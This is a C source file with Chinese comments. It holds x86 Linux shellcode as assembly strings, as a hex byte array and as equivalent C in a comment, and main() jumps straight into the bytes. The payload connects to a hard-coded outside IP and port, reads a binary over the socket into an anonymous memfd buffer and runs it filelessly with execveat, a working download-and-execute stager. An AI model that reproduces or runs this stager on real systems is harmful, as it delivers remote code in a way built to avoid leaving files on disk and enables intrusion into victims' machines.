#include<stdio.h>
void hexdump(const unsigned char * p, int len)
{
    for(int i=0;i<len;++i)
    {
        printf("\\x%02x", p[i]);
    }
    printf("\n");
}

int main()
{
puts(
"xor ebx, ebx;"\
"mul ebx;"\
"push ebx;"\
"inc ebx;"\
"push ebx;"\
"push 2;"\
"mov ecx, esp;"\
"mov al, 0x66;"\
"int 0x80;"\
//socket fd放在esp+0
"mov dword ptr [esp], eax;"\
//connect
"xchg eax, ebx;"\
"pop ecx;"\
"cond1:\n"\
"mov al, 0x3f;"\
"int 0x80;"\
"dec ecx;"\
"jns cond1;"\
"push 0xd094e75;"\
"push 0xd5dd0002;"\
"mov ecx, esp;"\
"mov al, 0x66;"\
"push eax;"\
"push ecx;"\
"push ebx;"\
"mov bl, 3;"\
"mov ecx, esp;"\
"int 0x80;"\
//接收文件长度，存放在ebp
"mov ebx,dword ptr [esp];"\
"lea ecx,[esp+4];"\
"xor eax,eax;"\
"mov al,3;"\
"mov dl, 4;"\
"int 0x80;"\

"mov ebp, dword ptr [esp+4];"\
//memfd_create
"xor eax,eax;"\
"push eax;"\
"push 0x164;"\
"pop eax;"\
"mov ebx,esp;"\
"push 1;"\
"pop ecx;"\
"int 0x80;"\
//将fd存放在esp+8
"mov dword ptr [esp+8], eax;"\
//ftruncate
"xchg eax,ebx;"\
"mov ecx,ebp;"\
"push 0x5d;"\
"pop eax;"\
"int 0x80;"\
//size页对齐
"mov eax,ebp;"\
"and eax,0xfff;"\
"test eax,eax;"\
"jz loc;"\
"mov eax,ebp;"\
"lea     edx, [eax+0FFFh];"\
"test eax,eax;"\
"cmovs   eax, edx;"\
"sar     eax, 0Ch;"\
"add     eax, 1;"\
"shl     eax, 0Ch;"\
"jmp mmap;"\
"loc:\n"\
"mov eax,ebp;"\
"cdqe;"\
//mmap
"mmap:\n"\
//对齐后size放到esp+0xc
"mov dword ptr [esp+0xc],eax;"\
"xor ebx,ebx;"\
"mov ecx,eax;"\
"mov dl,3;"\
"xor esi,esi;"\
"inc esi;"\
"mov edi,dword ptr [esp+8];"\
"push ebp;"\
"xor ebp,ebp;"\
"xor eax,eax;"\
"mov al,0xc0;"\
"int 0x80;"\
"pop ebp;"\
//读取剩余内容到MMAP内存
"mov ebx,dword ptr [esp];"\
"mov ecx,eax;"\
"mov edx,ebp;"\
"xor eax,eax;"\
"mov al,3;"\
"int 0x80;"\
//munmap
"mov ebx,ecx;"\
"mov ecx,dword ptr [esp+0xc];"\
"push 0x5b;"\
"pop eax;"\
"int 0x80;"\
//execeat(fd, "", argv, env, AT_EMPTY_PATH)
"mov ebx,dword ptr [esp+8];"\
"xor eax,eax;"\
"push eax;"\
"mov ecx, esp;"\
"xor edx,edx;"\
"xor esi,esi;"\
"push 0x1000;"\
"pop edi;"\
"push 0x166;"\
"pop eax;"\
"int 0x80;"
);

    /*
    使用以上ASM代码通过keystone生成，对应C代码：
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
	if (-1 == socket_desc) {
		perror("cannot create socket");
		exit(1);
	}
	
	// 设置远程服务器的信息
	server.sin_addr.s_addr = inet_addr("117.78.9.13");
	server.sin_family = AF_INET;
	server.sin_port = htons(56789);
	
	// 连接
	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
		perror("cannot connect");
		return 0;
	}
    
    //服务端先发送4字节文件长度（小端序）
    int len = 0;
    read(socket_desc, &len, 4);
    
    int fd = memfd_create("", 1);
    ftruncate(fd, len);
    char * shm = mmap(NULL, PAGE_ALIGN(len), 3, 1, fd, 0);
    if(shm == MAP_FAILED)
    {
        perror("mmap");
        return -1;
    }
    
    read(socket_desc, shm, len);
    munmap(shm, PAGE_ALIGN(len));
    
    execveat(fd, "", 0, 0, 0x1000);
    */
    unsigned char hexData[215] = {
        0x31, 0xDB, 0xF7, 0xE3, 0x53, 0x43, 0x53, 0x6A, 0x02, 0x89, 0xE1, 0xB0, 0x66, 0xCD, 0x80, 0x89,
        0x04, 0x24, 0x93, 0x59, 0xB0, 0x3F, 0xCD, 0x80, 0x49, 0x79, 0xF9, 0x68, 
        0x75, 0x4E, 0x09, 0x0D, //ip 117.78.9.13
        0x68, 0x02, 0x00, 
        0xDD, 0xD5, //端口 56789
        0x89, 0xE1, 0xB0, 0x66, 0x50, 0x51, 0x53, 0xB3, 0x03, 0x89, 0xE1,
        0xCD, 0x80, 0x8B, 0x1C, 0x24, 0x8D, 0x4C, 0x24, 0x04, 0x31, 0xC0, 0xB0, 0x03, 0xB2, 0x04, 0xCD,
        0x80, 0x8B, 0x6C, 0x24, 0x04, 0x31, 0xC0, 0x50, 0x68, 0x64, 0x01, 0x00, 0x00, 0x58, 0x89, 0xE3,
        0x6A, 0x01, 0x59, 0xCD, 0x80, 0x89, 0x44, 0x24, 0x08, 0x93, 0x89, 0xE9, 0x6A, 0x5D, 0x58, 0xCD,
        0x80, 0x89, 0xE8, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x18, 0x89, 0xE8, 0x8D, 0x90,
        0xFF, 0x0F, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x0C, 0x83, 0xC0, 0x01, 0xC1,
        0xE0, 0x0C, 0xEB, 0x03, 0x89, 0xE8, 0x98, 0x89, 0x44, 0x24, 0x0C, 0x31, 0xDB, 0x89, 0xC1, 0xB2,
        0x03, 0x31, 0xF6, 0x46, 0x8B, 0x7C, 0x24, 0x08, 0x55, 0x31, 0xED, 0x68, 0xC0, 0x00, 0x00, 0x00,
        0x58, 0xCD, 0x80, 0x5D, 0x8B, 0x1C, 0x24, 0x89, 0xC1, 0x89, 0xEA, 0x31, 0xC0, 0xB0, 0x03, 0xCD,
        0x80, 0x89, 0xCB, 0x8B, 0x4C, 0x24, 0x0C, 0x6A, 0x5B, 0x58, 0xCD, 0x80, 0x8B, 0x5C, 0x24, 0x08,
        0x31, 0xC0, 0x50, 0x89, 0xE1, 0x31, 0xD2, 0x31, 0xF6, 0x68, 0x00, 0x10, 0x00, 0x00, 0x5F, 0x68,
        0x66, 0x01, 0x00, 0x00, 0x58, 0xCD, 0x80 
    };

    
    hexdump(hexData, sizeof(hexData));
    fflush(0);

    void (*ptr)() = hexData;
    ptr();

    return 0;
}